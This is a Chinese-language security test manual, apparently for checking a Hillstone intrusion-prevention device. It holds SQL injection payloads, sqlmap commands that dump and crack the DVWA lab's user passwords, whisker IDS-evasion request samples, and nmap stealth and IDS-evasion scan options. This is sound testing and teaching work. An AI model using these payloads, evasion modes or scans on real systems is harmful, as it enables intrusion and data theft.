+扫描网站的时候，发现网站存在SQL盲注漏洞，你可以导入到SQL盲注工具中，你也可以直接将抓取的SQL盲注HTTP数据包粘贴到SQL盲注工具中进行注入测试。
+ 
+左下方显示当前的数据库的名字、用户名、版本，以及可列出数据库、表、字段、数据记录 ，如下图右击一个数据库可以获取表、右击表可以获取字段、右击表可以获取数据。
+ 
+
+3.4.7	 HTTP Editor
+HTTP Editor包含两种模式，一种Request、一种Text Only模式，主要用于编辑HTTP信息，修改HTTP信息并发送给服务器获取返回的结果，是HTTP信息的重放过程。可修改HTTP的头部数据或者其它信息再提交给服务器处理等。
+点击Start按钮，将当前编辑的HTTP请求提交给服务器处理，并获取返回结果。
+ 
+ 
+
+3.4.8	 HTTP Sniffer
+HTTP Sniffer可以拦截浏览器的数据包信息，并且可以将数据包发送到HTTP Edit编辑重放或者其它功能。
+将浏览器的代理设置为127.0.0.1:8080（默认），在Application Settings——HTTP Sniffer可以修改监听的端口和接收的请求范围。
+点击Start开始抓包，点击Stop停止抓包。
+ 
+
+3.4.9	 HTTP Fuzzer
+漏洞测试工具，用于批量数据自动提交，并测试出正确性的数据。与Burp中的intruder功能一致。
+1）点击右上方的ADD Generator添加字典，共包含6种字典。
+ 
+每个字典的配置如下
+ 
+2）在测试点击Insert into Request 
+ 
+3）点击Start开始攻击。攻击结果包括Fuzzer的次数统计、Fuzzer的结果显示、Request、Response等。
+ 
+
+3.5	Sqlmap工具解析
+DVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。
+sqlmap是一个自动化的SQL注入工具,其主要功能是扫描,发现并利用给定的URL的SQL注入漏洞。支持很多数据库。
+DVWA靶机的安装步骤参照3.1.1 DVWA介绍章节。
+3.5.1	 sql注入攻击原理
+在进行sqlmap注入案例之前，先需要了解下sql注入的原理：
+1、先看一下普通的数据库查询语句。如下：
+举例1：
+$sql = “SELECT * FROM `xxxx` WHERE `id` = ‘$id’ ORDER BY id ASC”;
+这是一条普通的查询语句。为了让程序能够通过get 或 post方式传参进行动态查询，一般都会通过在SQL语句中加入变量的方式进行查询；即上面语句中的变量”$id”。
+一般来说，PHP程序员都会使用$_GET[”]、$_REQUEST[”]等方式获取url中的传参。这样一来，便给了黑客可乘之机。
+举个例子，上面这条语句中如果对应的url为 www.abc.com/index.php?id=1 ， 那么程序语句实际上之行为：$sql = “SELECT * FROM `xxxx` WHERE `id` = 1 ORDER BY id ASC”;（确实，这样是没问题的）
+再举个例子，如果这条语句中对应的url为www.abc.com/index.php?id=1 and 1=1，那么程序语句已经变成了 $sql = “SELECT * FROM `xxxx` WHERE `id` = 1 and 1=1 ORDER BY id ASC”;
+因为1=1是true，所以将直接跳过认证页面显示id=1的相关信息。
+举例2：
+假如我们有一个users表，里面有两个字段username和password。在我们的java代码中我们初学者都习惯用sql拼接的方式进行用户验证。比如："select id from users where username = '"+username +"' and password = '" + password +"'" 这里的username和password都是我们存取从web表单获得的数据。下面我们来看一下一种简单的注入，如果我们在表单中username的输入框中输入' or 1=1-- ，password的表单中随便输入一些东西，假如这里输入123.此时我们所要执行的sql语句就变成了select id from users where username = '' or 1=1—and password = '123'，我们来看一下这个sql，因为1=1是true，后面 and password = '123'被注释掉了。所以这里完全跳过了sql验证。
+2、判断是否存在sql注入漏洞：
+当输入的参数YY为整型时，通常abc.asp中SQL语句原貌大致如下：
+Select * from 表名 where 字段=YY，所以可以用以下步骤测试SQL注入是否存在。
+1）HTTP://xxx.xxx.xxx/abc.asp?p=YY’(附加一个单引号)，此时abc.ASP中的SQL语句变成了
+Select * from 表名 where 字段=YY’，abc.asp运行异常；
+2）HTTP://xxx.xxx.xxx/abc.asp?p=YY and 1=1, abc.asp运行正常，而且与HTTP://xxx.xxx.xxx/abc.asp?p=YY运行结果相同；
+3）HTTP://xxx.xxx.xxx/abc.asp?p=YY and 1=2, abc.asp运行异常；
+如果以上三步全面满足，abc.asp中一定存在SQL注入漏洞。
+3.5.2	 Windows下的sqlmap的安装
+1. Python下载及安装
+https://www.python.org/
+1）Windows下推荐：2.7.13版本比较稳定：
+https://www.python.org/downloads/release/python-2713/ 
+2）接下来，默认下一步直到结束安装。
+3）最后在CMD中输入python，看看有没有安装成功，如果出现一下画面说明安装成功
+ 
+2. sqlmap的下载及安装
+1）http://sqlmap.org/下载sqlmap
+2）解压SqlMap.zip里面的文件
+3）找到你安装python的目录（python安装的默认路径是：C:\Python27中）
+ 
+4）在python文件夹中创建一个新的文件夹，并命名为“SqlMap”
+5）然后把之前2）步骤解压的SqlMap中的文件全部复制到C:\Python27\sqlmap文件夹中
+ 
+6）在桌面空白处右键创建一个新的快捷方式：并命名为“Sqlmap”
+ 
+7）这里我们需要修改2个地方，一个是“目标”，一个是“起始位置”。
+如图：
+ 
+8）创建好之后，运行你刚才创建的SqlMap快捷方式 这样就可以在Windows运行SqlMap了。
+执行命令：python sqlmap/sqlmap.py -help
+ 
+
+3.5.3	 sqlmap工具使用
+1. 查找注入点
+1）打开wireshark，监视lo网卡（因为是本机）
+2）在DVWA的SQL Injection页面上有一个userid输入框，随便输入然后点击submit
+ 
+3）在wireshark中可以找到GET信息
+其中有Request URI和Cookie信息
+比如：
+ 
+Cookies：PHPSESSID=s87ff7rjp3ta76v77f9rpf6jg7
+
+4）使用sqlmap查找注入点
+sqlmap.py -u "http://localhost/DVWA-1.9/vulnerabilities/sqli/?id=2&Submit=Submit" --cookie="security=low; bdshare_firstime=1407830747693; PHPSESSID=s87ff7rjp3ta76v77f9rpf6jg7"
+得到可能的注入点是id，数据库是mysql
+[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+2. sql注入案例
+1）sqlmap.py -u "http://localhost/DVWA-1.9/vulnerabilities/sqli/?id=2&Submit=Submit" --cookie="security=low; bdshare_firstime=1407830747693; PHPSESSID=s87ff7rjp3ta76v77f9rpf6jg7" --current-db 
+得到当前数据库名
+current database: 'dvwa'
+2）sqlmap.py -u "http://localhost/DVWA-1.9/vulnerabilities/sqli/?id=2&Submit=Submit" --cookie="security=low; bdshare_firstime=1407830747693; PHPSESSID=s87ff7rjp3ta76v77f9rpf6jg7" --current-db --tables -Ddvwa
+使用dvwa库得到表名
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+3）sqlmap.py -u "http://localhost/DVWA-1.9/vulnerabilities/sqli/?id=2&Submit=Submit" --cookie="security=low; bdshare_firstime=1407830747693; PHPSESSID=s87ff7rjp3ta76v77f9rpf6jg7" -T guestbook --columns
+得到guestbook的表结构
+Database: dvwa
+Table: guestbook
+[3 columns]
++------------+----------------------+
+| Column | Type |
++------------+----------------------+
+| comment | varchar(300) |
+| comment_id | smallint(5) unsigned |
+| name | varchar(100) |
++------------+----------------------+
+得到users表结构:
+Database: dvwa
+Table: users
+[6 columns]
++------------+-------------+
+| Column | Type |
++------------+-------------+
+| user | varchar(15) |
+| avatar | varchar(70) |
+| first_name | varchar(15) |
+| last_name | varchar(15) |
+| password | varchar(32) |
+| user_id | int(6) |
++------------+-------------+
+
+4）sqlmap.py -u "http://localhost/DVWA-1.9/vulnerabilities/sqli/?id=2&Submit=Submit" --cookie="security=low; bdshare_firstime=1407830747693; PHPSESSID=s87ff7rjp3ta76v77f9rpf6jg7" -T users --dump
+得到users表的内容
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+---------------------------------+----------------------------------+-----------+------------+
+| user_id | user | avatar | password | last_name | first_name |
++---------+---------+---------------------------------+----------------------------------+-----------+------------+
+| 1 | admin | dvwa/hackable/users/admin.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 | admin | admin |
+| 2 | gordonb | dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown | Gordon |
+| 3 | 1337 | dvwa/hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b | Me | Hack |
+| 4 | pablo | dvwa/hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso | Pablo |
+| 5 | smithy | dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith | Bob |
++---------+---------+---------------------------------+----------------------------------+-----------+------------+
+
+5）同命令4,在sqlmap询问时候破解密码时，选择是，sqlmap会使用自己的字典来破解密码，得到5个用户的密码。
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+---------------------------------+---------------------------------------------+-----------+------------+
+| user_id | user | avatar | password | last_name | first_name |
++---------+---------+---------------------------------+---------------------------------------------+-----------+------------+
+| 1 | admin | dvwa/hackable/users/admin.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin |
+| 2 | gordonb | dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon |
+| 3 | 1337 | dvwa/hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack |
+| 4 | pablo | dvwa/hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo |
+| 5 | smithy | dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob |
++---------+---------+---------------------------------+---------------------------------------------+-----------+------------+
+
+6）此时，DVWA的sql injection任务完成。
+3.5.4	 山石NIPS设备sql注入防护案例
+1.测试环境搭建
+1）测试目的和重点：
+测试DUT针对sql注入的检测行为。
+在DUT上基于HTTP预定义特征集创建一个特征集，开启它的sql注入检查功能，设置敏感度为高，同时指定执行动作为reset。在访问server站点时通过sql注入流量，在DUT上show logging ips 查看log信息是否与配置的执行动作一致。
+2）组网：
+client(1.1.1.200)--（1.1.1.1）Hillstone-NIPS（10.1.1.1）--server(10.1.1.100)
+2. NIPS设备注入攻击防护
+1）DUT配置步骤：
+登录ui，新建IPS profile。
+在协议配置中选择HTTP下的webserver。
+然后对webserver进行编辑，勾选sql注入检查，详细配置见下图：
+ 
+2）通过sqlmap查找注入点：
+sqlmap.py -u "http://10.1.1.100/DVWA-1.9/vulnerabilities/sqli/?id=2&Submit=Submit" --cookie="security=low; bdshare_firstime=1407830747693; PHPSESSID=s87ff7rjp3ta76v77f9rpf6jg7"
+ 
+3）上图显示攻击被成功阻断，查看设备，发现设备成功报日志并reset。
+8JRebvOj# show logging threat 
+2017-10-13 16:29:14, CRIT@IPS: CRITICAL! From 1.1.1.200:53820(ethernet1/2) to 10.1.1.100:80(ethernet0/1), threat name: WEB SQL injection attempt -23 CVE-2011-0511, threat type: Attack, threat subtype: Web Attack, App/Protocol: HTTP, action: pcap, reset, defender: IPS, signature ID: 305423, profile: all_in, threat severity: High, policy id: 1, aggregation attack count 32
+3.6	 逃逸工具whisker
+3.6.1	 逃逸工具whisker安装
+1. Download Whisker 2.1 from
+http://packetstormsecurity.com/files/30564/whisker-2.1.tar.gz.html
+2. Install whisker-2.1
+解压 tar -vxzf whisker-2.1.tar.gz
+在解压目录下：more README，根据里面的安装说明执行：
+perl install.pl
+注：libwhisker2-2.5.tar解压即可，无需安装（lib库中有逃逸相关选项）
+Following is the instruction:
+0. Very useful document, A look at whisker’s anti-IDS tacttics, written by Whisker’s author, Rain Forest Puppy:
+http://www.ussrback.com/docs/papers/IDS/whiskerids.html
+3.6.2	 逃逸工具whisker使用
+1. Ask R&D team to get one uri which will trigger alert, such as following: (You can skip this step)
+ alert TCP any any -> any 80 (msg:"WEB Wordpress Slash Theme Full Path Disclosure Vulnerability"; uricontent:"/wp-content/themes/slash/index.php"; nocase; classtype:Web Attacks; priority:4; sid:1112686;)
+2. Remove /usr/local/share/whisker/main.test
+3. Create /usr/local/share/whisker/main.test as following:
+push @{$G_HOOKS{TESTS}}, \&m_evasion_test;
+sub m_evasion_test {
+        wgeneral('/','wp-content/themes/slash/index.php',id=>'1000');
+}
+wp-content/themes/slash/index.php为攻击特征，根据需要修改
+or 
+push @{$G_HOOKS{TESTS}}, \&m_evasion_test;
+sub m_evasion_test {
+        wgeneral('/','etc/motd',id=>'1000');
+}
+对应的预定义id：/*1049406*/
+idp_signature 6711:http
+{
+        signature: http_req_uri($1 <> /|2f|etc|2f|motd/i);
+        port: any,[80];
+};
+4. Setup test environment as following:
+     Web server <---> DUT <---> Whisker
+3.6.3	 逃逸工具whisker支持的逃逸模式
+1. Execute following command:
+   /usr/local/share/whisker/whisker.pl –h <web server IP> -I <Anti-IDS mode>
+-I 1 IDS-evasive mode 1 (URL encoding)
+-I 2 IDS-evasive mode 2 (/./ directory insertion)
+-I 3 IDS-evasive mode 3 (premature URL ending)
+-I 4 IDS-evasive mode 4 (long URL)
+-I 5 IDS-evasive mode 5 (fake parameter)
+-I 6 IDS-evasive mode 6 (TAB separation) (not NT/IIS)
+-I 7 IDS-evasive mode 7 (case sensitivity)
+-I 8 IDS-evasive mode 8 (Windows delimiter)
+-I 9 IDS-evasive mode 9 (session splicing) (slow)
+-I 0 IDS-evasive mode 0 (NULL method)
+For examples, following will test modes from 0 to 9:
+/usr/local/share/whisker/whisker.pl –h 10.111.0.200 –I 1234567890
+or 
+whisker –h 10.111.0.200 –I 1234567890 
+（注：I要大写）
+2. Test all combinations:
+     1, 2, 3, 4, 5, 6, 7, 8, 9, 0
+     12, 13, 14, ... 23, 24, 25 ...
+     123, 124, 125 ... 234, 235, 236 ...
+     ...
+     1234567890
+3. Packet dump:
+ Original:
+     /wp-content/themes/slash/index.php
+样本packet： 
+Mode 1:
+     GET /%77p%2dc%6f%6et%65%6et/t%68em%65%73/sla%73h/%69%6ed%65x.p%68p
+ 
+Mode 2:
+     GET /./wp-content/./themes/./slash/./index.php
+ 
+Mode 3:
+     GET /%20HTTP/1.1%0D%0A%Accept%3A%2066IrRro8qyFqfz4G64/../../wp-content/themes/slash/index.php
+ 
+Mode 4:
+     GET /nsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLsnsmnHcwdSyz6TLs/../wp-content/themes/slash/index.php
+ 
+Mode 5:
+     GET /D7ELqlk7DPmkfep.html%3foqhpusBzIvVHPD=/..//wp-content/themes/slash/index.php
+ 
+Mode 6:
+     GET     /wp-content/themes/slash/index.php
+ 
+Mode 7:
+     GET /wp-COnTenT/tHemES/SlASH/IndEx.pHP
+ 
+Mode 8:
+     GET /wp-content\themes\slash\index.php
+ 
+Mode 9:
+     G
+     E
+     T
+    
+     /
+     w
+     p
+     -
+     c
+     o
+     n
+     t
+     e
+     n
+     t
+     ...
+
+Mode 10:
+     GET%00/wp-content/themes/slash/index.php
+ 
+Mode 1,2:
+     GET /%2e%2f%77p%2d%63%6fn%74e%6e%74%2f./%74h%65me%73/%2e/%73%6c%61sh/%2e%2f%69n%64ex.p%68%70
+ 
+Mode 1,2,3,4,5,6,7,8:
+     GET     /%20HTTP/1.1%0D%0A%Accept%3A%20DephsxiczOdb/../../8u6LGvoPF81X.html%3fh0wyfI2UJyCJKsrmY=/..//.%5c%58F%44%5a%4fJ6%53JF%4cUMX%66DZ%4fj%36S%4a%46LU%4dX%66D%5a%4fj6%53%4a%46L%55MX%66%44%5a%4f%4a6%53%4a%46L%55M%58%66%44Z%4fJ6%53%4a%46%4c%55%4d%58%46D%5aOj%36SJF%4cUMX%46D%5aOj%36SJ%46LU%4dX%66D%5aOJ%36%53%4a%46L%55%4dX%46%44ZO%6a%36%53%4aFLUM%58%46DZOj6%53J%46%4cUM%58FDZ%4fJ6SJ%46%4cUM%58FD%5a%4fj6%53JFL%55%4dXF%44%5a%4fJ%36%53J%46%4cUMXFDZO%6a%36%53%4a%46%4cU%4d%58fDZ%4fJ%36S%4aFL%55%4d%58%66DZO%6a6%53J%46%4c%55%4dX%46DZO%4a6%53JF%4cUMX%46DZ%4fJ6%53%4aF%4c%55MXfDZ%4f%6a6S%4a%46L%55%4dX%46DZO%6a6S%4a%46%4c%55MX%46%44ZO%4a6S%4a%46LUM%58F%44Z%4fJ6%53J%46L%55%4dX%66D%5a%4f%6a6%53%4a%46LU%4d%58f%44Z%4fJ%36SJ%46%4cU%4dX%66D%5aO%6a%36SJF%4c%55%4dXF%44Z%4f%4a6SJF%4c%55MX%66%44%5a%4f%4a%36SJFLU%4dX%66D%5a%4fj6SJF%4cUMX%46D%5aOj%36SJ%46LU%4dXf%44%5aO%6a6S%4a%46LUM%58F%44%5aOJ6S%4a%46LU%4d%58fDZ%4f%4a6S%4a%46LUMX%46%44Z%4fJ6SJ%46LU%4dXfD%5aO%6a%36S%4a%46L%55MX%66%44%5aOJ6%53%4aF%4cU%4dX%66%44%5aOj%36%53J%46LUMX%66D%5aO%6a6%53JFLUM%58%46%44%5aO%4a%36%53%4a%46L%55%4dX%46%44ZO%4a6S%4aF%4c%55%4d%58f%44%5a%4fj6%53JFL%55%4d%5c.\%2e%2e%5c%2e\%57p-COnT%65Nt\.%5c%54h%65%6d%45S%5c%2e\SLasH\.%5c%69%6eD%45%58%2e%70%68%70
+3.6.4	 山石NIPS设备sql注入防护案例
+1．测试环境搭建
+1）测试目的和重点：
+测试DUT针对逃逸的检测行为。
+咱们设备默认是支持逃逸检测的，所以相关配置只需要开启ips功能即可。
+2）组网：
+whisker(192.168.3.2)—(192.168.3.1)Hillstone-NIPS(10.1.1.1)--server(10.1.1.100)
+2．NIPS设备逃逸防护
+1）DUT配置步骤：
+登录ui，在policy中直接引用IPS预定义模板predef_default。
+ 
+后续测试逃逸流量会命中该policy。
+2）通过whisker构造逃逸流量：
+a）随机选择设备特征库中的某个特征，根据这个特征来对whisker发送的内容进行构造。
+/*1049406*/
+idp_signature 5173:http
+{          
+        signature: http_req_uri($1 <> /|2f|etc|2f|motd/i);
+        port: any,[80];
+};
+构造main.test，目录为/usr/local/share/whisker/main.test：
+push @{$G_HOOKS{TESTS}}, \&m_evasion_test;
+ 
+sub m_evasion_test {
+        wgeneral('/','etc/motd',id=>'1000');
+}
+
+b）组网完成后，执行main.test脚本，让流量经过nips设备到server。
+whisker –h 10.1.1.100 –I 1234567890 
+查看设备，发现设备成功报日志并reset。
+8JRebvOj# show logging  threat 
+2017-10-17 14:23:29, CRIT@IPS: CRITICAL! From 192.168.3.2:56240(ethernet0/3.1000) to 10.1.1.100:80(ethernet0/1), threat name: WEB /etc/motd File Download, threat type: Attack, threat subtype: Access Control, App/Protocol: HTTP, action: reset, defender: IPS, signature ID: 305173, profile: predef_default, threat severity: High, policy id: 1, aggregation attack count 1
+ 
+3.7	 NMAP测试工具
+3.7.1	 NMAP工具安装
+1、从nmap官网https://nmap.org下载安装包，选择下载windows二进制的。
+ 
+2、然后按步骤点击“下一步”，直至安装完成。
+ 
+3.7.2	 nmap工具使用
+1. nmap扫描
+nmap扫描参数介绍
+当用户有明确的扫描目标时，可以直接使用Nmap工具实施扫描。
+根据扫描目标的多少，可以分为扫描单个目标、多个目标及目标列表三种情况。
+常见的一些扫描参数：
+ 
+ 
+ 
+ 
+举例：
+扫描整个子网,命令如下:
+#nmap 192.168.1.1/24
+扫描多个目标,命令如下：
+#nmap 192.168.1.2 192.168.1.5
+扫描一个范围内的目标,如下：
+#nmap 192.168.1.1-100 (扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)
+如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：
+#nmap -iL target.txt
+如果你想看到你扫描的所有主机的列表，用以下命令:
+#nmap -sL 192.168.1.1/24
+扫描除过某一个ip外的所有子网主机,命令：
+#nmap 192.168.1.1/24 -exclude 192.168.1.1
+扫描除过某一个文件中的ip外的子网主机命令
+#nmap 192.168.1.1/24 -exclude file xxx.txt  (xxx.txt中的文件将会从扫描的主机中排除)
+扫描特定主机上的80,21,23端口,命令如下
+#nmap -p80,21,23 192.168.1.1zui
+举例：
+扫描局域网中IP地址为10.180.187.2的主机。执行命令nmap -T4 -A -v 10.180.187.2：
+ 
+ 
+从以上输出信息，可以看到共扫描的主机所开放的端口及服务，以及这台主机对应的操作系统。
+Tcp SYN Scan (sS)
+这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话。因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势。如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN。
+ 
+扫描结果：
+ 
+Udp scan(sU)
+顾名思义,这种扫描技术用来寻找目标主机打开的UDP端口。它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的。
+ 
+扫描结果：
+ 
+
+FIN scan (sF)
+有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在。目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手。
+ 
+扫描结果：
+ 
+FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一)。每个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包。
+
+版本检测(sV)
+版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本，使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口。
+ 
+扫描结果：
+ 
+
+Nmap的OS检测（O/PN）
+Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过 获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。
+ 
+扫描结果：
+ 
+
+如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。
+使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现。
+ 
+扫描结果：
+ 
+
+2．nmap时间和性能
+1） nmap时间和性能参数介绍
+Nmap开发的最高优先级是性能。在本地网络对一个主机的默认扫描需要1/5秒。而仅仅眨眼的时间，就需要扫描上万甚至几十万的主机。此外，一些特定的扫描选项会明显增加扫描时间，如UDP扫描和版本检测。同样，防火墙配置以及特殊的响应速度限制也会 增加时间。Nmap使用了并行算法和许多先进的算法来加速扫描，用户对Nmap如何 工作有最终的控制权。高级用户可以仔细地调整Nmap命令，在满足时间要求的同时获得他们所关心的信息。
+改善扫描时间的技术有：忽略非关键的检测、升级最新版本的Nmap(性能增强不断改善)。 优化时间参数也会带来实质性的变化，这些参数如下。
+ 
+2） min-hostgroup/max-hostgroup
+Nmap具有并行扫描多主机端口或版本的能力，Nmap将多个目标IP地址空间分成组，然后在同一时间对一个组进行扫描。通常大的组更有效。缺点是只有当整个组扫描结束后才会提供主机的扫描结果。如果组的大小定义为50，则只有当前50个主机扫描结束后才能得到报告。
+默认方式下，Nmap采取折衷的方法。开始扫描时的组较小，最小为5，这样便于尽快产生结果；随后增长组的大小，最大为1024。确切的大小依赖于所给定的选项。为保证效率，针对UDP或少量端口的TCP扫描，Nmap 使用大的组。
+--max-hostgroup选项用于说明使用最大的组，Nmap不会超出这个大小。--min-hostgroup选项说明最小的组，Nmap会保持组大于这个值。如果在指定的接口上没有足够的目标主机来满足所 指定的最小值，Nmap可能会采用比所指定的值小的组。这两个参数虽然很少使用， 但都用于保持组的大小在一个指定的范围之内。
+这些选项的主要用途是说明一个最小组的大小，使得整个扫描更加快速。通常选择256来扫描C类网段。对于端口数较多的扫描，超出该值没有意义。对于端口数较少的扫描，2048或更大的组大小是有帮助的。
+举例：对10.180.187.0/24网段进行tcp syn扫描，其中：最大并行探测主机数量为256；最小并行探测主机数量为5。
+ 
+扫描结果如下：
+ 
+3） min-parallelism/max-parallelism
+这些选项控制用于主机组的探测报文数量，可用于端口扫描和主机发现。默认状态下， Nmap基于网络性能计算一个理想的并行度，这个值经常改变。如果报文被丢弃，Nmap降低速度，探测报文数量减少。随着网络性能的改善，理想的探测报文数量会缓慢增加。这些选项确定这个变量的大小范围。默认状态下，当网络不可靠时，理想的并行度值可能为1，在好的条件下，可能会增长至几百。
+最常见的应用是--min-parallelism值大于1，以加快性能不佳的主机或网络的扫描。这个选项具有风险，如果过高则影响准确度，同时也会降低Nmap基于网络条件动态控制并行度的能力。这个值设为10较为合适，这个值的调整往往作为最后的手段。
+--max-parallelism选项通常设为1，以防止Nmap在同一时间向主机发送多个探测报文，和选择--scan-delay同时使用非常有用。
+配置：
+ 
+扫描结果如下：
+ 
+4） min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout
+Nmap使用一个运行超时值来确定等待探测报文响应的时间，随后会放弃或重新发送探测报文。Nmap基于上一个探测报文的响应时间来计算超时值，如果网络延迟比较显著和不定，这个超时值会增加几秒。初始值的比较保守(高)，而当Nmap扫描无响应的主机时，这个保守值会保持一段时间。
+--min-rtt-timeout：最小探测超时，最少花费给定时间来等待探测回复和重传探测，这个选项很少使用。
+--max-rtt-timeout：最大探测超时，最多花费给定时间来等待探测回复和重传探测。
+注：如果使用太小的值，使得很多探测报文超时从而重新发送，而此时可能响应消息正在发送，这使得整个扫描的时间会增加。
+--initial-rtt-timeout：初始化探测超时，用给定时间作为往返初始预计时间，如果用户了解需要扫描的网络，可以加速扫描。
+如果所有的主机都在本地网络，对于--max-rtt-timeout值来说，100毫秒比较合适。如果存在路由，首先使用ICMP ping工具ping主机，或使用其它报文工具如hpings，可以更好地穿透防火墙。查看大约10个包的最大往返时间，然后将 --initial-rtt-timeout设成这个时间的2倍，--max-rtt-timeout可设成这个时间值的3倍或4倍。通常，不管ping的时间是多少，最大的rtt值不得小于100ms，不能超过1000ms。
+ 
+5）host-timeout
+由于性能较差或不可靠的网络硬件或软件、带宽限制、严格的防火墙等原因， 一些主机需要很长的时间扫描。这些极少数的主机扫描往往占据了大部分的扫描时间。因此，最好的办法是减少时间消耗并且忽略这些主机，使用 --host-timeout选项来说明等待的时间(毫秒)。通常使用1800000 来保证Nmap不会在单个主机上使用超过半小时的时间。需要注意的是，Nmap在这半小时中可以同时扫描其它主机，因此并不是完全放弃扫描。超时的主机被忽略，因此也没有针对该主机的端口表、操作系统检测或版本检测结果的输出。
+ 
+6） scan-delay/max-scan-delay 
+这个选项用于Nmap控制针对一个主机发送探测报文的等待时间(毫秒)，在带宽控制的情况下这个选项非常有效。Solaris主机在响应UDP扫描探测报文报文时，每秒只发送一个ICMP消息，因此Nmap发送的很多数探测报文是浪费的。--scan-delay 设为1000，使Nmap低速运行。Nmap尝试检测带宽控制并相应地调整扫描的延迟，但并不影响明确说明何种速度工作最佳。
+--scan-delay的另一个用途是躲闭基于阈值的入侵检测和预防系统(IDS/IPS)。
+ 
+7）-T <Paranoid|Sneaky|Polite|Normal|Aggressive|Insane> 
+上述优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外，往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap提供了一些简单的方法，使用6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、aggressive (4)和insane (5)。前两种模式用于IDS躲避，Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。默认模式为Normal，因此-T3实际上是未做任何优化。Aggressive模式假设用户具有合适及可靠的网络从而加速扫描。Insane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。
+用户可以根据自己的需要选择不同的模板，由Nmap负责选择实际的时间值。模板也会针对其它的优化控制选项进行速度微调。例如，-T4 针对TCP端口禁止动态扫描延迟超过10ms，-T5对应的值为5ms。模板可以和优化调整控制选项组合使用，但模板必须首先指定，否则模板的标准值 会覆盖用户指定的值。建议在扫描可靠的网络时使用 -T4，即使 在自己要增加优化控制选项时也使用(在命令行的开始)，从而从这些额外的较小的优化中获益。
+如果用于有足够的带宽或以太网连接，仍然建议使用-T4选项。有些用户喜欢-T5选项，但这个过于强烈。有时用户考虑到避免使主机崩溃或者希望更礼貌一些会采用-T2选项。他们并没意识到-T Polite选项是如何的慢，这种模式的扫描比默认方式实际上要多花10倍的时间。默认时间 选项(-T3)很少有主机崩溃和带宽问题，比较适合于谨慎的用户。不进行版本检测比进行时间调整能更有效地解决这些问题。
